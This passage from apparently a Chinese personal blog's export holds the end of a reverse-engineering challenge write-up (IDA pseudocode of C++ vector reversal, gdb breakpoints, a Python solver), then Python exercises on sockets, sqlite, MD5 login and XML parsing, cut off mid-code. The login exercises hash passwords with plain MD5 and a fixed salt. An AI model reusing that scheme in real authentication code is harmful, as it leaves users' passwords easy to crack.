<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> a7)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v10 = a3;</span><br><span class="line">  v9 = a4;</span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v11, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v11);<span class="comment">//v11就是我们输入的元素，这里你可以对照我上面部分的注释，看传入的参数是什么</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v9);</span><br><span class="line"></span><br><span class="line">    main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v14, &amp;a7, &amp;v13, v7);<span class="comment">//这里是重点，倒置就在这里面</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(v9, &amp;v14);<span class="comment">//赋值语句没什么好说的</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v11);<span class="comment">//自增语句</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(v12, v9);</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先告诉你们我调试出来的结果吧，这部分让我自己看这ida代码，我看了好久，都没看懂他在干嘛，应该还是太菜了，所以我用gdb调试了一波，发觉他是每次取出一个元素，假设第一个元素，取出，第二个元素取出的时候，将他作为容器，将第一组的元素一个个push入栈达到逆置，然后保存这个容器，在取出一个元素，在创建一个只含这个元素的容器，将其作为主容器，将上次保存的容器的每个元素一个个进行push_back();然后循环一直下去就可以达到逆置的效果</p>
<p>举个例子说明吧： 假设元素为 1 2 3 4 5 6 7 8 9 10<br>第一次：创建一个只含1的容器(1)，其余什么都不做<br>第二次：创建一个只含2的容器(2)，将第一次创建的容器(1)里的元素，全部push到容器(2)里，保存容器(2)<br>第三次：创建一个只含3的容器(3),将容器2里的元素全部push到容器3里面</p>
<p>具体观察过程可以在循环里下断点进行观察，或者直接步过这部分，直接得到结果知道，由于我这里是分析文章，所以就进行了具体的分析</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::__copy_move&lt;<span class="literal">false</span>,<span class="literal">false</span>,<span class="built_in">std</span>::random_access_iterator_tag&gt;::__copy_m&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;&gt;(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = (a2 - a1) &gt;&gt; <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v5);</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v3, v7);<span class="comment">// 这里创建新容器，将数据压入栈</span></span><br><span class="line">    v7 += <span class="number">4L</span>L;</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上一部分我标注的重点里，一直点进去能看到这里的代码，在这里下断，随你用gdb还是ida都可以在这里观察整个过程，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x000000000040133f &lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; std::accumulate&lt;__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)<span class="comment">#2&#125;&gt;(__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;)+113&gt;</span></span><br><span class="line">	breakpoint already hit 8 <span class="built_in">times</span></span><br><span class="line">2       breakpoint     keep y   0x0000000000400fd0 &lt;main+511&gt;</span><br><span class="line">3       breakpoint     keep y   0x00000000004020b3 &lt;std::back_insert_iterator&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;::operator=(int const&amp;)+33&gt;</span><br><span class="line">	breakpoint already hit 6 <span class="built_in">times</span></span><br></pre></td></tr></table></figure>
<p>我这里用info b让你看下我下的断点，具体也可以自己进行调试，这样会让你更加理解这部分代码<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26uordtnnj31ha0qutji.jpg" alt="result"></p>
<p>我这里截了部分图，这是第一次循环的时候得到的结果，他只push了8进去，具体调试地址可以从ida里看，在代码界面右键Copy to assembly,在右键<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v4wpbkmj30vu0h6jsw.jpg" alt="picture1"><br>可以得到如下图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v5tijt7j312w0fatch.jpg" alt="picture2"><br>这里便可以获得具体地址，然后调试部分就不讲了，有时间在写篇gdb如何调试的吧，在这题目里需要用的指令有</p>
<ul>
<li>x/10wx 显示的如第一张图所显示的一样</li>
<li>n 下一步</li>
<li>s 步进，也就是步进函数内部</li>
<li>c 继续</li>
<li>start 在开始处下断点</li>
</ul>
<p>具体的话:<br>这道题就是输入的第2-16个元素依次加上第一个元素，然后倒序排列，等于斐波那契数列就得出flag了，所以，反推之就是斐波那契数列倒序排列，在2-16个元素减去第一个元素就完美了，贴上代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span>(n==<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    array= [fib(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)][::<span class="number">-1</span>]</span><br><span class="line">    first = array[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> first,</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(array)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">print</span> array[i+<span class="number">1</span>] - first,</span><br></pre></td></tr></table></figure>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26wkec4pdj30zp0badir.jpg" alt="test"><br>运行截图</p>
<p>把这段复制到linux上运行即可得到flag，或者直接逆向也得到了</p>
<p>我的这篇文章文字不多，大部分文字都在代码里写注释了，因为这篇文章针对的就是如何分析C++的vector的反汇编代码，具体多余的文字赘述我也就没写了</p>
<h3 id="总结下："><a href="#总结下：" class="headerlink" title="总结下："></a><strong>总结下：</strong></h3><ol>
<li>在ida的f5插件识别出来的不会是你理想的c++代码，比如v24.begin(); 他会变成std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v24)；</int></li>
<li>在ida的f5插件识别出来的代码下，不清楚的部分可以跟进去，看看具体是什么操作</li>
<li>需要了解常见的vector容器的基本操作，在自己遇到的时候可以快速识别，不需要步进了解具体过程</li>
<li>在不了解具体过程的情况下，可以进行动态调试，方便自己理解</li>
</ol>
<p>好了，就说这么多了，我这篇图贴的不多，大部分都是代码，似乎都是代码，希望大佬们不要见怪</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>reverse</category>
        <category>c++</category>
      </categories>
      <tags>
        <tag>reverse,逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第八天</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><p>服务端与客户端间通过TCP/IP协议通信</p><p><strong>服务端</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connetction from %s:%s...'</span> %addr)</span><br><span class="line">    sock.send(<span class="string">b'Welcome'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>) == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello, &#123;&#125;'</span>.format(data).encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">    sock.close()</span><br><span class="line">    print(<span class="string">'Connection from %s:%s closed.'</span> %addr)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">print(<span class="string">'Waiting for connection...'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=tcplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><a id="more"></a>


<p><strong>客户端</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p><strong>练习：请编写函数，在 Sqlite 中根据分数段查找指定的名字：</strong></p>
<p>这道题刚好上学期java期末作业做过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sqlite3</span><br><span class="line"></span><br><span class="line">db_file = os.path.join(os.path.dirname(__file__), <span class="string">'test.db'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(db_file):</span><br><span class="line">    os.remove(db_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始数据:</span></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(db_file)</span><br><span class="line"></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">'create table user(id varchar(20) primary key, name varchar(20), score int)'</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-001', 'Adam', 95)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-002', 'Bart', 62)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-003', 'Lisa', 78)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.close()</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一种我想得到的写法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user order by score"</span>)</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    List = []</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> values:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">2</span>] &gt;= low <span class="keyword">and</span> result[<span class="number">2</span>]&lt;=high:</span><br><span class="line">            List.append(result[<span class="number">1</span>])</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> List</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种写法，感觉更好，直接用数据库排好序了，不知道sql语法的可以跟我上面那个一样</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user where score between ? and ? order by score"</span>,(low,high))</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    name = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> values]</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">80</span>, <span class="number">95</span>) == [<span class="string">'Adam'</span>], get_score_in(<span class="number">80</span>, <span class="number">95</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">80</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>], get_score_in(<span class="number">60</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">100</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>, <span class="string">'Adam'</span>],get_score_in(<span class="number">60</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第七天学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="hashlib的使用"><a href="#hashlib的使用" class="headerlink" title="hashlib的使用"></a>hashlib的使用</h2><p><strong>设计一个验证用户登录的函数，根据用户输入的口令是否正确，返回True 或 False：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><a id="more"></a>

<p>so easy,直接贴代码吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user,password)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (db[user],calc_md5(password))</span><br><span class="line">    <span class="keyword">if</span> db[user] == calc_md5(password):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> login(<span class="string">'bob'</span>,<span class="string">'123456'</span>):</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"success"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"fail"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>根据用户输入的登录名和口令模拟用户注册，计算更安全的 MD5：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">db[username] = get_md5(password + username + <span class="string">'the-Salt'</span>)</span><br><span class="line">然后，根据修改后的 MD5 算法实现用户登录的验证：</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>这种题目也是送分题啊，直接贴代码了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    db[username] = calc_md5(password + username + <span class="string">'the-Salt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> db[username] == calc_md5(password + username + <span class="string">'the-Salt'</span>):</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"sucess"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"fail"</span>)</span><br><span class="line"></span><br><span class="line">register(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br><span class="line">register(<span class="string">'robot'</span>,<span class="string">'123456'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'12345'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="xml解析"><a href="#xml解析" class="headerlink" title="xml解析"></a>xml解析</h2><p><strong>请利用 SAX 编写程序解析 Yahoo 的 XML 格式的天气预报，获取当天<br>和第二天的天气：</strong><br>这部分对我来说有点难理解，不过查阅资料和看博客后自己依葫芦画瓢还是做出来了<br>贴上代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> xml.parsers.expat <span class="keyword">import</span> ParserCreate</span><br><span class="line">data = <span class="string">r'''&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span></span><br><span class="line"><span class="string">&lt;rss version="2.0" xmlns:yweather="http://xml.weather.yahoo.com/ns/rss/1.0" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"&gt;</span></span><br><span class="line"><span class="string">    &lt;channel&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Yahoo! Weather - Beijing, CN&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;lastBuildDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/lastBuildDate&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:location city="Beijing" region="" country="China"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:units temperature="C" distance="km" pressure="mb" speed="km/h"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:wind chill="28" direction="180" speed="14.48" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:atmosphere humidity="53" visibility="2.61" pressure="1006.1" rising="0" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:astronomy sunrise="4:51 am" sunset="7:32 pm"/&gt;</span></span><br><span class="line"><span class="string">        &lt;item&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:lat&gt;39.91&lt;/geo:lat&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:long&gt;116.39&lt;/geo:long&gt;</span></span><br><span class="line"><span class="string">            &lt;pubDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/pubDate&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:condition text="Haze" code="21" temp="28" date="Wed, 27 May 2015 11:00 am CST" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Wed" date="27 May 2015" low="20" high="33" text="Partly Cloudy" code="30" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Thu" date="28 May 2015" low="21" high="34" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Fri" date="29 May 2015" low="18" high="25" text="AM Showers" code="39" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sat" date="30 May 2015" low="18" high="32" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:forecast day="Sun" date="31 May 2015" low="20" high="37" text="Sunny" code="32" /&gt;</span></span><br><span class="line"><span class="string">        &lt;/item&gt;</span></span><br><span class="line"><span class="string">    &lt;/channel&gt;</span></span><br><span class="line"><span class="string">&lt;/rss&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">weather_dict=&#123;&#125;</span><br><span class="line">day = <span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WeatherSaxHandler</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_element</span><span class="params">(self, name, attrs)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> weather_dict,day</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:location'</span>:</span><br><span class="line">            weather_dict[<span class="string">'city'</span>] = attrs[<span class="string">'city'</span>]</span><br><span class="line">            weather_dict[<span class="string">'country'</span>] = attrs[<span class="string">'country'</span>]</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'yweather:forecast'</span>:</span><br><span class="line">            day = day + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> day == <span class="number">1</span> :</span><br><span class="line">                weather_dict[<span 